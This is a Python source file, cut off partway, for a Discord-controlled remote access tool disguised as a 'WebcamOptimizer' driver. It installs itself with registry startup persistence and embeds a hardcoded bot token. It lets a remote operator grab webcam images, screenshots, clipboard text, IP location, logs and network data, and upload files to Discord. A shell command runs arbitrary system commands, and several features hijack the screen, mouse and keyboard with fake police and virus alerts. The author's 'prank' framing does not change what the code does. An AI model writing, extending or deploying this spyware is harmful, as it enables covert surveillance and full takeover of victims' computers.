

#dont send this to random people please keep this with us
#this is just me messing with my coding abilities not for actual harm just a side project for me and caden to work on
import os
import platform
import uuid
import hashlib
import time
import asyncio
import shutil
import winreg
import subprocess
import psutil
import sys
import random
import threading
import discord
from discord.ext import commands
from datetime import datetime, timezone
from io import BytesIO
from PIL import Image, ImageTk
import tkinter as tk
from tkinter import messagebox, ttk
import cv2
import mss
import wmi
import winsound
import logging
import requests
import win32api
import win32con
import win32gui
import win32evtlog
import win32clipboard
import webbrowser
import ctypes
import json
import tkinter as tk
from tkinter import messagebox

def show_warning():
    root = tk.Tk()
    root.withdraw()  # Hide the main window
    messagebox.showwarning("⚠️ WARNING ⚠️", 
        "This contains malware and is just used for me and my friends to troll each other with. "
        "Don't run it if you don't know us or are just clueless.")
    root.destroy()
    
    show_warning()

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Suppress Discord logging
logging.getLogger('discord.client').setLevel(logging.CRITICAL)
logging.getLogger('discord.gateway').setLevel(logging.CRITICAL)

# Bot configuration
DISCORD_TOKEN = 'MTMzNDU5NDgzNzEzMDc3MjU3MQ.GGqM9o.gnym4_h7yITtTsA1JlnkH5dLf9xdYJP60b1gsQ'
TARGET_GUILD_ID = 1365994445186531399
INSTALL_DIR = os.path.join(os.getenv('APPDATA'), 'WebcamOptimizer')
UPLOAD_DIR = os.path.join(INSTALL_DIR, 'Uploads')
ASSET_DIR = os.path.join(INSTALL_DIR, 'assets')
EXE_NAME = 'WebcamOptimizer.exe'
SCRIPT_NAME = 'WebcamOptimizer.py'
REG_PATH = r'Software\Microsoft\Windows\CurrentVersion\Run'
REG_NAME = 'WebcamOptimizer'
BOT_PREFIX = '.'

# Asset keys for pranks
ASSET_KEYS = {
    'jumpscare_image': 'Image for jumpscare prank (.png/.jpg)',
    'jumpscare_sound': 'Sound for jumpscare prank (.wav)',
    'police_image': 'Image for fake police prank (.png/.jpg)',
    'siren_sound': 'Sound for fake police prank (.wav)',
    'virus_sound': 'Sound for fake virus prank (.wav)',
    'silly_sound': 'Sound for sound spam prank (.wav)',
    'loud_sound': 'Sound for volume blast prank (.wav)',
    'prank_wallpaper': 'Image for setwallpaper prank (.png/.jpg)'
}

# Silly pop-up messages
POPUP_MESSAGES = [
    "Reminder: You haven't seen my dih.",
    "Error: There's nothing left to distract you from the silence.",
    "Warning: Even your PC is tired of your jerking off.",
    "System Message: Time keeps passing, but nothing changes.",
    "Notice: This machine can't fix."
]

# Nonsense phrases for typenonsense
NONSENSE_PHRASES = [
    "h3lp my pc is h4ck3d",
    "i am a robot beep boop",
    "error 404 not found",
    "send help im stuck in a loop",
    "smegma overload detected"
]

def print_driver_boot():
    """Simulate webcam driver initialization in console."""
    driver_messages = [
        "[MIUInputDrv] Micro Innovations USB Input Device v3.42.118",
        "[MIUInputDrv] Initializing USB 3.1 Gen2 Controller [VID:0x1A3F PID:0xC123]...",
        "[MIUInputDrv] Detecting OV5640 CMOS sensor [I2C:0x3C]...",
        "[MIUInputDrv] Loading V4L2 kernel module (v4l2loopback)...",
        "[MIUInputDrv] Probing device: /dev/video0 [USB:2-1.3]",
        "[MIUInputDrv] Setting frame buffer: 320x240 @ 30fps, MJPEG",
        "[MIUInputDrv] Calibrating lens distortion matrix [FOV:78°]...",
        "[MIUInputDrv] Syncing with DirectShow pipeline [CLSID:0x4FD2]...",
        "[MIUInputDrv] Firmware v3.42.118 loaded [SHA:0x8F2B1C]...",
        "[MIUInputDrv] Driver initialized. Latency: 12ms"
    ]
    for msg in driver_messages:
        print(msg)
        time.sleep(random.uniform(0.05, 0.2))

def get_unique_pc_id():
    """Generate a unique PC identifier."""
    system_info = f"{platform.node()}-{platform.system()}-{platform.processor()}-{uuid.getnode()}"
    return hashlib.sha256(system_info.encode()).hexdigest()[:8]

def get_channel_name():
    """Create a consistent channel name based on PC ID."""
    pc_id = get_unique_pc_id()
    hostname = platform.node().lower().replace(' ', '-')
    return f"cam-{hostname}-{pc_id}"

def ensure_single_instance():
    """Ensure only one instance of the bot is running."""
    process_name = EXE_NAME if sys.argv[0].endswith('.exe') else 'python.exe'
    current_pid = os.getpid()
    script_path = os.path.abspath(sys.argv[0])
    for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
        if proc.info['name'] == process_name and proc.info['pid'] != current_pid:
            try:
                cmdline = proc.info['cmdline']
                if cmdline and script_path in ' '.join(cmdline):
                    proc.terminate()
            except Exception:
                pass
    return True

def ensure_persistence():
    """Install script and set it to run on startup."""
    try:
        if not os.path.exists(INSTALL_DIR):
            os.makedirs(INSTALL_DIR)
        if not os.path.exists(UPLOAD_DIR):
            os.makedirs(UPLOAD_DIR)
        if not os.path.exists(ASSET_DIR):
            os.makedirs(ASSET_DIR)

        current_file = os.path.abspath(sys.argv[0])
        is_exe = current_file.endswith('.exe')
        target_file = os.path.join(INSTALL_DIR, EXE_NAME if is_exe else SCRIPT_NAME)

        if current_file != target_file:
            shutil.copy2(current_file, target_file)

        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_SET_VALUE)
        reg_value = f'"{target_file}"' if is_exe else f'"{sys.executable}" "{target_file}"'
        winreg.SetValueEx(key, REG_NAME, 0, winreg.REG_SZ, reg_value)
        winreg.CloseKey(key)
    except Exception as e:
        logger.error(f"Persistence setup failed: {str(e)}")

def get_asset_path(asset_key):
    """Get the file path for an asset."""
    try:
        config_path = os.path.join(ASSET_DIR, 'assets.json')
        if os.path.exists(config_path):
            with open(config_path, 'r') as f:
                config = json.load(f)
            filename = config.get(asset_key)
            if filename and os.path.exists(os.path.join(ASSET_DIR, filename)):
                return os.path.join(ASSET_DIR, filename)
        return None
    except Exception as e:
        logger.error(f"Failed to get asset {asset_key}: {str(e)}")
        return None

def set_asset(asset_key, filename):
    """Assign a file to an asset key."""
    try:
        file_path = os.path.join(ASSET_DIR, filename)
        if not os.path.exists(file_path):
            return f"File '{filename}' not found in {ASSET_DIR}"
        config_path = os.path.join(ASSET_DIR, 'assets.json')
        config = {}
        if os.path.exists(config_path):
            with open(config_path, 'r') as f:
                config = json.load(f)
        config[asset_key] = filename
        with open(config_path, 'w') as f:
            json.dump(config, f)
        return f"Set {asset_key} to '{filename}'"
    except Exception as e:
        return f"Failed to set {asset_key}: {str(e)}"

async def save_attachment(attachment, allowed_extensions=['.jpg', '.jpeg', '.png', '.wav']):
    """Save an attachment to ASSET_DIR if it has an allowed extension."""
    try:
        if attachment.size > 8 * 1024 * 1024:
            return "File too large (max 8MB)."
        if not any(attachment.filename.lower().endswith(ext) for ext in allowed_extensions):
            return f"Unsupported file type. Allowed: {', '.join(allowed_extensions)}"
        file_path = os.path.join(ASSET_DIR, attachment.filename)
        await attachment.save(file_path)
        return f"File '{attachment.filename}' saved to {ASSET_DIR}."
    except Exception as e:
        return f"Error saving attachment: {str(e)}"

def capture_webcam_image():
    """Capture an image from the webcam."""
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return None, None, None
        cap.set(cv2.CAP_PROP_FRAME_WIDTH, 320)
        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 240)
        ret, frame = cap.read()
        cap.release()
        if not ret:
            return None, None, None
        image = Image.fromarray(cv2.cvtColor(frame, cv2.COLOR_BGR2RGB))
        metadata = {"resolution": f"{image.width}x{image.height}"}
        return image, "webcam", metadata
    except Exception as e:
        logger.error(f"Webcam capture failed: {str(e)}")
        return None, None, None

def get_monitor_screenshots():
    """Capture screenshots of all monitors."""
    try:
        with mss.mss() as sct:
            monitors = sct.monitors[1:]
            screenshots = []
            for i, monitor in enumerate(monitors[:2]):
                if monitor['width'] <= 0 or monitor['height'] <= 0:
                    continue
                sct_img = sct.grab(monitor)
                screenshot = Image.frombytes('RGB', (sct_img.width, sct_img.height), sct_img.rgb)
                metadata = {
                    "resolution": f"{monitor['width']}x{monitor['height']}",
                    "coordinates": f"left={monitor['left']}, top={monitor['top']}"
                }
                screenshots.append((screenshot, f"monitor_{i+1}", metadata))
            return screenshots
    except Exception as e:
        logger.error(f"Screenshot capture failed: {str(e)}")
        return []

def get_system_info():
    """Retrieve system information."""
    try:
        c = wmi.WMI()
        system = c.Win32_ComputerSystem()[0]
        os_info = c.Win32_OperatingSystem()[0]
        cpu = c.Win32_Processor()[0]
        total_ram = int(os_info.TotalVisibleMemorySize) / 1024 / 1024
        return {
            "OS": f"{os_info.Caption} {os_info.BuildNumber}",
            "CPU": cpu.Name,
            "RAM": f"{total_ram:.2f} GB",
            "Hostname": platform.node(),
            "Architecture": platform.architecture()[0]
        }
    except Exception as e:
        logger.error(f"System info retrieval failed: {str(e)}")
        return {"Error": "Failed to retrieve system info"}

def get_ip_location():
    """Retrieve public IP and geolocation info."""
    try:
        response = requests.get('https://ipinfo.io/json', timeout=5)
        response.raise_for_status()
        data = response.json()
        return {
            "IP": data.get('ip', 'Unknown'),
            "City": data.get('city', 'Unknown'),
            "Region": data.get('region', 'Unknown'),
            "Country": data.get('country', 'Unknown'),
            "Location": data.get('loc', 'Unknown'),
            "Org": data.get('org', 'Unknown')
        }
    except Exception as e:
        logger.error(f"IP location retrieval failed: {str(e)}")
        return {"Error": f"Failed to retrieve IP/location: {str(e)}"}

def list_webcams():
    """List available webcam devices."""
    try:
        index = 0
        webcams = []
        while True:
            cap = cv2.VideoCapture(index)
            if not cap.isOpened():
                break
            name = f"Webcam {index}"
            webcams.append({"index": index, "name": name})
            cap.release()
            index += 1
        return webcams if webcams else [{"index": -1, "name": "No webcams found"}]
    except Exception as e:
        logger.error(f"Webcam listing failed: {str(e)}")
        return [{"index": -1, "name": "Error listing webcams"}]

def get_webcam_settings(index):
    """Get settings for a specific webcam."""
    try:
        cap = cv2.VideoCapture(index)
        if not cap.isOpened():
            return {"Error": f"Webcam {index} not found"}
        width = cap.get(cv2.CAP_PROP_FRAME_WIDTH)
        height = cap.get(cv2.CAP_PROP_FRAME_HEIGHT)
        fps = cap.get(cv2.CAP_PROP_FPS)
        cap.release()
        return {
            "Index": index,
            "Resolution": f"{int(width)}x{int(height)}",
            "FPS": f"{fps:.2f}"
        }
    except Exception as e:
        logger.error(f"Webcam settings retrieval failed: {str(e)}")
        return {"Error": f"Failed to get settings for webcam {index}"}

def list_processes():
    """List running processes with PIDs and names."""
    try:
        processes = []
        for proc in psutil.process_iter(['pid', 'name']):
            processes.append({"PID": proc.info['pid'], "Name": proc.info['name']})
        return processes[:50]
    except Exception as e:
        logger.error(f"Process listing failed: {str(e)}")
        return [{"PID": -1, "Name": "Error listing processes"}]

def get_disk_info():
    """Get disk usage and free space."""
    try:
        disks = []
        for disk in psutil.disk_partitions():
            try:
                usage = psutil.disk_usage(disk.mountpoint)
                disks.append({
                    "Mount": disk.mountpoint,
                    "Total": f"{usage.total / (1024**3):.2f} GB",
                    "Used": f"{usage.used / (1024**3):.2f} GB",
                    "Free": f"{usage.free / (1024**3):.2f} GB",
                    "Percent": f"{usage.percent}%"
                })
            except Exception as e:
                logger.warning(f"Failed to access disk {disk.mountpoint}: {str(e)}")
                continue
        return disks if disks else [{"Mount": "N/A", "Total": "No disks found"}]
    except Exception as e:
        logger.error(f"Disk info retrieval failed: {str(e)}")
        return [{"Mount": "N/A", "Total": f"Error: {str(e)}"}]

async def send_images(channel, images, command):
    """Send images to Discord with an embed."""
    try:
        if not images:
            embed = discord.Embed(
                title="⚠️ Webcam Error",
                description=f"No images captured for `{command}`.",
                color=0xFF5555,
                timestamp=datetime.now(timezone.utc)
            )
            embed.set_footer(text=f"Webcam Optimizer | ID: {get_unique_pc_id()}")
            await channel.send(embed=embed)
            return

        embed = discord.Embed(
            title="📸 Webcam Capture",
            description=f"Optimizing visuals for `{command}`.",
            color=0x00FF88,
            timestamp=datetime.now(timezone.utc)
        )
        embed.set_footer(text=f"Webcam Optimizer | ID: {get_unique_pc_id()}")
        embed.add_field(name="🖥️ Hostname", value=platform.node(), inline=True)
        embed.add_field(name="🆔 PC ID", value=get_unique_pc_id(), inline=True)

        files = []
        for i, (image, name, metadata) in enumerate(images):
            image_binary = BytesIO()
            image.save(image_binary, format='JPEG', quality=50)
            image_binary.seek(0)
            filename = f'{name}_{datetime.now().strftime("%Y%m%d_%H%M%S")}.jpg'
            files.append(discord.File(image_binary, filename=filename))
            field_value = f"**Resolution**: {metadata['resolution']}\n**Captured**: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            if "coordinates" in metadata:
                field_value += f"\n**Coordinates**: {metadata['coordinates']}"
            embed.add_field(name=f"📸 {name.capitalize()}", value=field_value, inline=False)

        await channel.send(files=files, embed=embed)
        for file in files:
            file.close()
    except Exception as e:
        logger.error(f"Image send failed for {command}: {str(e)}")
        await channel.send("Failed to send images.")

async def send_text(channel, title, description, color=0x00FF88):
    """Send a text embed to Discord."""
    try:
        embed = discord.Embed(
            title=title,
            description=description,
            color=color,
            timestamp=datetime.now(timezone.utc)
        )
        embed.set_footer(text=f"Webcam Optimizer | ID: {get_unique_pc_id()}")
        embed.add_field(name="🖥️ Hostname", value=platform.node(), inline=True)
        embed.add_field(name="🆔 PC ID", value=get_unique_pc_id(), inline=True)
        await channel.send(embed=embed)
    except Exception as e:
        logger.error(f"Text send failed: {str(e)}")
        await channel.send("Failed to send message.")

def safe_thread_target(target, command_name):
    """Ensure the thread target is callable and not a command object."""
    if not callable(target):
        logger.error(f"Invalid thread target for {command_name}: {target} is not callable")
        raise TypeError(f"Thread target for {command_name} is not callable")
    return target

def trigger_jumpscare():
    """Display a jumpscare image and play a sound."""
    try:
        img_path = get_asset_path('jumpscare_image')
        sound_path = get_asset_path('jumpscare_sound')
        if not img_path or not sound_path:
            raise ValueError("Required jumpscare assets (image or sound) are missing. Use .setasset to assign them.")
        img = Image.open(img_path)
        img = img.resize((1280, 720), Image.Resampling.LANCZOS)

        root = tk.Tk()
        root.attributes('-fullscreen', True)
        root.attributes('-topmost', True)

        tk_img = ImageTk.PhotoImage(img)
        label = tk.Label(root, image=tk_img)
        label.pack(fill='both', expand=True)

        winsound.PlaySound(sound_path, winsound.SND_FILENAME | winsound.SND_ASYNC)

        root.after(3000, root.destroy)
        root.mainloop()
    except Exception as e:
        logger.error(f"Jumpscare failed: {str(e)}")
        raise

def popup_spam(duration=10):
    """Spam pop-up messages for the specified duration (seconds)."""
    try:
        end_time = time.time() + duration
        while time.time() < end_time:
            message = random.choice(POPUP_MESSAGES)
            threading.Thread(target=lambda: messagebox.showwarning("System Alert", message), daemon=True).start()
            time.sleep(random.uniform(0.5, 1.5))
    except Exception as e:
        logger.error(f"Popup spam failed: {str(e)}")

def fake_bsod():
    """Display a fake Blue Screen of Death."""
    try:
        root = tk.Tk()
        root.attributes('-fullscreen', True)
        root.attributes('-topmost', True)
        root.configure(bg='blue')

        error_message = (
            "A problem has been detected and Windows has been shut down to prevent damage to your computer.\n\n"
            "CRITICAL_SMEGMA_OVERLOAD\n\n"
            "If this is the first time you've seen this error screen, restart your computer. If this screen appears again, "
            "consider eating fewer percs.\n\n"
            "Technical information:\n*** STOP: 0x00000YUM (0xCHEESE, 0xBURGER, 0xFRIES, 0xSHAKE)"
        )

        label = tk.Label(
            root,
            text=error_message,
            font=("Courier", 14),
            fg="white",
            bg="blue",
            justify="left",
            anchor="nw",
            padx=20,
            pady=20
        )
        label.pack(fill='both', expand=True)

        root.after(5000, root.destroy)
        root.mainloop()
    except Exception as e:
        logger.error(f"Fake BSOD failed: {str(e)}")

def fake_police_prank():
    """Display a fake police alert with siren and FBI warning image."""
    try:
        img_path = get_asset_path('police_image')
        sound_path = get_asset_path('siren_sound')
        if not img_path or not sound_path:
            raise ValueError("Police prank assets missing")

        def show_alert():
            messagebox.showerror(
                "🚨 POLICE ALERT 🚨",
                "Your PC is under investigation for illegal trafficking!\n"
                "The authorities have been notified. Please remain calm.\n"
                "Arrest in progress: ETA 5 minutes."
            )

        threading.Thread(target=show_alert, daemon=True).start()

        img = Image.open(img_path)
        img = img.resize((1280, 720), Image.Resampling.LANCZOS)

        root = tk.Tk()
        root.attributes('-fullscreen', True)
        root.attributes('-topmost', True)

        tk_img = ImageTk.PhotoImage(img)
        label = tk.Label(root, image=tk_img)
        label.pack(fill='both', expand=True)

        winsound.PlaySound(sound_path, winsound.SND_FILENAME | winsound.SND_ASYNC)

        root.after(10000, root.destroy)
        root.mainloop()
    except Exception as e:
        logger.error(f"Fake police prank failed: {str(e)}")

def fake_virus():
    """Display a fake virus alert with scanning animation."""
    try:
        sound_path = get_asset_path('virus_sound')
        root = tk.Tk()
        root.attributes('-fullscreen', True)
        root.attributes('-topmost', True)
        root.configure(bg='black')

        label = tk.Label(
            root,
            text="🚨 VIRUS DETECTED! 🚨\nYour PC is infected with 47 threats!\nScanning in progress...",
            font=("Courier", 16),
            fg="red",
            bg="black",
            justify="center"
        )
        label.pack(pady=50)

        scan_text = tk.Text(root, height=10, font=("Courier", 12), fg="green", bg="black")
        scan_text.pack(pady=20)
        scan_text.insert(tk.END, "Initializing scan...\n")

        def update_scan():
            paths = [f"C:\\Windows\\System32\\file{random.randint(1, 999)}.dll" for _ in range(5)]
            for i, path in enumerate(paths):
                scan_text.insert(tk.END, f"Scanning {path}... {random.randint(0, 3)} threats found\n")
                scan_text.see(tk.END)
                root.update()
                time.sleep(1)
            root.after(2000, root.destroy)

        threading.Thread(target=update_scan, daemon=True).start()
        if sound_path:
            winsound.PlaySound(sound_path, winsound.SND_FILENAME | winsound.SND_ASYNC)
        else:
            logger.warning("Virus sound asset missing, proceeding without sound")
        root.mainloop()
    except Exception as e:
        logger.error(f"Fake virus failed: {str(e)}")

def mousetrap(duration=10):
    """Randomly move the mouse cursor for the specified duration."""
    try:
        end_time = time.time() + duration
        while time.time() < end_time:
            x, y = win32api.GetCursorPos()
            dx = random.randint(-50, 50)
            dy = random.randint(-50, 50)
            win32api.SetCursorPos((x + dx, y + dy))
            time.sleep(random.uniform(0.1, 0.5))
    except Exception as e:
        logger.error(f"Mousetrap failed: {str(e)}")

def typenonsense(duration=5):
    """Simulate random typing in the active window."""
    try:
        phrase = random.choice(NONSENSE_PHRASES)
        end_time = time.time() + duration
        for char in phrase:
            if time.time() > end_time:
                break
            vk = win32api.VkKeyScan(char)
            win32api.keybd_event(vk & 0xFF, 0, 0, 0)
            time.sleep(random.uniform(0.05, 0.15))
            win32api.keybd_event(vk & 0xFF, 0, win32con.KEYEVENTF_KEYUP, 0)
            time.sleep(random.uniform(0.05, 0.15))
    except Exception as e:
        logger.error(f"Typenonsense failed: {str(e)}")

def flipdesktop(duration=10):
    """Rotate the desktop display 180 degrees temporarily."""
    try:
        dm = win32api.EnumDisplaySettings(None, win32con.ENUM_CURRENT_SETTINGS)
        original_angle = dm.DisplayOrientation
        dm.DisplayOrientation = (original_angle + 2) % 4
        dm.PelsWidth, dm.PelsHeight = dm.PelsHeight, dm.PelsWidth
        win32api.ChangeDisplaySettings(dm, 0)
        time.sleep(duration)
        dm.DisplayOrientation = original_angle
        dm.PelsWidth, dm.PelsHeight = dm.PelsHeight, dm.PelsWidth
        win32api.ChangeDisplaySettings(dm, 0)
    except Exception as e:
        logger.error(f"Flipdesktop failed: {str(e)}")

def soundspam(count=5):
    """Play a silly sound repeatedly."""
    try:
        sound_path = get_asset_path('silly_sound')
        if not sound_path:
            raise ValueError("Silly sound asset missing")
        for _ in range(count):
            winsound.PlaySound(sound_path, winsound.SND_FILENAME | winsound.SND_ASYNC)
            time.sleep(random.uniform(1, 2))
    except Exception as e:
        logger.error(f"Soundspam failed: {str(e)}")

def get_clipboard():
    """Retrieve clipboard text."""
    try:
        win32clipboard.OpenClipboard()
        try:
            data = win32clipboard.GetClipboardData(win32con.CF_TEXT)
            try:
                return data.decode('utf-8', errors='replace')[:1900]
            except UnicodeDecodeError:
                return "Clipboard contains non-text data or invalid encoding"
        except Exception:
            return "Clipboard empty or non-text data"
        finally:
            win32clipboard.CloseClipboard()
    except Exception as e:
        logger.error(f"Clipboard retrieval failed: {str(e)}")
        return f"Failed to get clipboard: {str(e)}"

def set_wallpaper():
    """Set desktop wallpaper to the prank wallpaper asset."""
    try:
        img_path = get_asset_path('prank_wallpaper')
        if not img_path:
            raise ValueError("Prank wallpaper asset missing")
        win32gui.SystemParametersInfo(win32con.SPI_SETDESKWALLPAPER, img_path, 3)
        return "Wallpaper set successfully"
    except Exception as e:
        logger.error(f"Wallpaper set failed: {str(e)}")
        return f"Failed to set wallpaper: {str(e)}"

def get_system_logs():
    """Retrieve recent Windows Event Logs."""
    try:
        server = 'localhost'
        log_type = 'System'
        hand = win32evtlog.OpenEventLog(server, log_type)
        flags = win32evtlog.EVENTLOG_BACKWARDS_READ | win32evtlog.EVENTLOG_SEQUENTIAL_READ
        events = []
        total = min(win32evtlog.GetNumberOfEventLogRecords(hand)[0], 20)
        records = win32evtlog.ReadEventLog(hand, flags, 0)
        for event in records[:10]:
            description = event.StringInserts if event.StringInserts else ["No description"]
            events.append({
                "Time": event.TimeGenerated.Format(),
                "EventID": event.EventID & 0xFFFF,
                "Description": description[0][:100] if description else "No description"
            })
        win32evtlog.CloseEventLog(hand)
        return events if events else [{"Time": "N/A", "EventID": -1, "Description": "No events found"}]
    except Exception as e:
        logger.error(f"System logs retrieval failed: {str(e)}")
        return [{"Time": "N/A", "EventID": -1, "Description": f"Error: {str(e)}"}]

def get_network_info():
    """List active network connections."""
    try:
        connections = []
        for conn in psutil.net_connections()[:20]:
            if conn.pid:
                try:
                    proc = psutil.Process(conn.pid)
                    proc_name = proc.name()
                except psutil.NoSuchProcess:
                    proc_name = "Unknown"
            else:
                proc_name = "System"
            connections.append({
                "Local": f"{conn.laddr.ip}:{conn.laddr.port}",
                "Remote": f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else "N/A",
                "Status": conn.status,
                "Process": proc_name
            })
        return connections if connections else [{"Local": "N/A", "Remote": "N/A", "Status": "No connections"}]
    except Exception as e:
        logger.error(f"Network info retrieval failed: {str(e)}")
        return [{"Local": "N/A", "Remote": "N/A", "Status": f"Error: {str(e)}"}]

def get_battery_info():
    """Get battery status."""
    try:
        battery = psutil.sensors_battery()
        if not battery:
            return {"Status": "No battery detected"}
        return {
            "Percent": f"{battery.percent}%",
            "Charging": "Yes" if battery.power_plugged else "No",
            "Time Left": f"{battery.secsleft // 3600}h {(battery.secsleft % 3600) // 60}m" if battery.secsleft > 0 else "Unknown"
        }
    except Exception as e:
        logger.error(f"Battery info retrieval failed: {str(e)}")
        return {"Status": f"Error: {str(e)}"}

def taskbarhide(duration=10):
    """Hide the taskbar temporarily."""
    try:
        hwnd = win32gui.FindWindow("Shell_TrayWnd", None)
        if hwnd:
            win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
            time.sleep(duration)
            win32gui.ShowWindow(hwnd, win32con.SW_SHOW)
    except Exception as e:
        logger.error(f"Taskbarhide failed: {str(e)}")

def volumeblast():
    """Set volume to max and play a loud sound."""
    try:
        sound_path = get_asset_path('loud_sound')
        if not sound_path:
            raise ValueError("Loud sound asset missing")
        for i in range(50):  # Max volume
            ctypes.windll.winmm.waveOutSetVolume(0, 0xFFFF)
            time.sleep(0.01)
        winsound.PlaySound(sound_path, winsound.SND_FILENAME | winsound.SND_ASYNC)
        time.sleep(2)
    except Exception as e:
        logger.error(f"Volumeblast failed: {str(e)}")

def fake_update():
    """Display a fake Windows Update screen."""
    try:
        root = tk.Tk()
        root.attributes('-fullscreen', True)
        root.attributes('-topmost', True)
        root.configure(bg='blue')

        label = tk.Label(
            root,
            text="Windows Update\nDo not turn off your PC\nThis will take a while...",
            font=("Arial", 20),
            fg="white",
            bg="blue",
            justify="center"
        )
        label.pack(pady=50)

        progress = ttk.Progressbar(root, length=300, mode='determinate')
        progress.pack(pady=20)
        progress['value'] = 99

        root.after(10000, root.destroy)
        root.mainloop()
    except Exception as e:
        logger.error(f"Fake update failed: {str(e)}")

# Bot setup
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix=BOT_PREFIX, intents=intents)
PC_CHANNEL = None

# Remove default help command to avoid conflict
bot.remove_command("help")

async def check_channel(message):
    """Check if the message is in the correct guild and channel."""
    try:
        if message.guild.id != TARGET_GUILD_ID or message.channel != PC_CHANNEL:
            await message.channel.send("This command can only be used in the designated channel.")
            return False
        return True
    except Exception as e:
        logger.error(f"Error in check_channel: {str(e)}")
        return False

@bot.event
async def on_ready():
    """Initialize bot and connect to a single channel."""
    global PC_CHANNEL
    try:
        if not ensure_single_instance():
            logger.error("Instance conflict detected. Terminating.")
            await bot.close()
            return
        guild = bot.get_guild(TARGET_GUILD_ID)
        if not guild:
            logger.error("Target guild not found.")
            await bot.close()
            return
        bot_member = guild.get_member(bot.user.id)
        if not bot_member.guild_permissions.send_messages:
            logger.error("Bot lacks send_messages permission in guild.")
            await bot.close()
            return
        channel_name = get_channel_name()
        PC_CHANNEL = discord.utils.get(guild.text_channels, name=channel_name)
        if not PC_CHANNEL:
            PC_CHANNEL = await guild.create_text_channel(channel_name)
        embed = discord.Embed(
            title="📷 Webcam Optimizer Online",
            description=f"Use `{BOT_PREFIX}help` for commands.",
            color=0x00FF88,
            timestamp=datetime.now(timezone.utc)
        )
        embed.add_field(name="🖥️ Hostname", value=platform.node(), inline=True)
        embed.add_field(name="🆔 PC ID", value=get_unique_pc_id(), inline=True)
        await PC_CHANNEL.send(embed=embed)
        logger.info("Bot is ready.")
    except Exception as e:
        logger.error(f"Bot startup failed: {str(e)}")
        await bot.close()

@bot.command(name="webcam", description="Capture webcam image.")
async def webcam(ctx):
    if not await check_channel(ctx.message):
        return
    try:
        image, name, metadata = capture_webcam_image()
        images = [(image, name, metadata)] if image else []
        await send_images(ctx.channel, images, f"{BOT_PREFIX}webcam")
    except Exception as e:
        await send_text(ctx.channel, "📸 Webcam", f"Error: {str(e)}", 0xFF5555)

@bot.command(name="monitor", description="Capture monitor screenshots.")
async def monitor(ctx):
    if not await check_channel(ctx.message):
        return
    try:
        images = get_monitor_screenshots()
        await send_images(ctx.channel, images, f"{BOT_PREFIX}monitor")
    except Exception as e:
        await send_text(ctx.channel, "🖥️ Monitor", f"Error: {str(e)}", 0xFF5555)

@bot.command(name="screenshot", description="Alias for monitor screenshots.")
async def screenshot(ctx):
    if not await check_channel(ctx.message):
        return
    try:
        images = get_monitor_screenshots()
        await send_images(ctx.channel, images, f"{BOT_PREFIX}screenshot")
    except Exception as e:
        await send_text(ctx.channel, "🖥️ Screenshot", f"Error: {str(e)}", 0xFF5555)

@bot.command(name="status", description="Report bot status.")
async def status(ctx):
    if not await check_channel(ctx.message):
        return
    try:
        await send_text(ctx.channel, "📷 Optimizer Status", "Webcam Optimizer active!", 0x00FF88)
    except Exception as e:
        await send_text(ctx.channel, "📷 Status", f"Error: {str(e)}", 0xFF5555)

@bot.command(name="systeminfo", description="Get system info (OS, CPU, RAM, etc.).")
async def systeminfo(ctx):
    if not await check_channel(ctx.message):
        return
    try:
        info = get_system_info()
        embed = discord.Embed(
            title="🖥️ System Info",
            description="System specifications for webcam optimization.",
            color=0x00FF88,
            timestamp=datetime.now(timezone.utc)
        )
        embed.set_footer(text=f"Webcam Optimizer | ID: {get_unique_pc_id()}")
        for key, value in info.items():
            embed.add_field(name=key, value=value, inline=True)
        await ctx.send(embed=embed)
    except Exception as e:
        await send_text(ctx.channel, "🖥️ System Info", f"Error: {str(e)}", 0xFF5555)

@bot.command(name="jumpscare", description="Trigger a jumpscare with image and sound.")
async def jumpscare(ctx):
    if not await check_channel(ctx.message):
        return
    try:
        if ctx.message.attachments:
            result = await save_attachment(ctx.message.attachments[0], ['.jpg', '.jpeg', '.png'])
            if "saved" in result.lower():
                set_asset('jumpscare_image', ctx.message.attachments[0].filename)
            else:
                await send_text(ctx.channel, "😱 Jumpscare", result, 0xFF5555)
                return
        threading.Thread(target=safe_thread_target(trigger_jumpscare, "jumpscare"), daemon=True).start()
        await send_text(ctx.channel, "😱 Jumpscare", "Jumpscare triggered!", 0x00FF88)
    except Exception as e:
        await send_text(ctx.channel, "😱 Jumpscare", f"Error: {str(e)}", 0xFF5555)

@bot.command(name="shell", description="Execute shell command.")
async def shell(ctx, *, command):
    if not await check_channel(ctx.message):
        return
    try:
        process = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=15)
        output = process.stdout + process.stderr or "No output."
        if len(output) > 1900:
            output = output[:1900] + "... (truncated)"
        await send_text(ctx.channel, "💻 Shell", f"```\n{output}\n```", 0x00FF88)
    except subprocess.TimeoutExpired:
        await send_text(ctx.channel, "💻 Shell", "Command timed out.", 0xFF5555)
    except Exception as e:
        await send_text(ctx.channel, "💻 Shell", f"Error: {str(e)}", 0xFF5555)

@bot.command(name="download", description="Upload file from PC to Discord.")
async def download(ctx, filename):
    if not await check_channel(ctx.message):
        return
    try:
        file_path = os.path.join(ASSET_DIR, filename) if os.path.exists(os.path.join(ASSET_DIR, filename)) else os.path.join(UPLOAD_DIR, filename)
        if not os.path.exists(file_path):
            await send_text(ctx.channel, "📁 Download", f"File '{filename}' not found.", 0xFF5555)
            return
        file_size = os.path.getsize(file_path)
        if file_size > 8 * 1024 * 1024:
            await send_text(ctx.channel, "📁 Download", "File too large (max 8MB).", 0xFF5555)
            return
        with open(file_path, 'rb') as f:
            await ctx.send(file=discord.File(f, os.path.basename(file_path)))
        await send_text(ctx.channel, "📁 Download", f"Uploaded '{filename}'.", 0x00FF88)
    except Exception as e:
        await send_text(ctx.channel, "📁 Download", f"Error: {str(e)}", 0xFF5555)

@bot.command(name="upload", description="Upload file from Discord to PC.")
async def upload(ctx):
    if not await check_channel(ctx.message):
        return
    try:
        if not ctx.message.attachments:
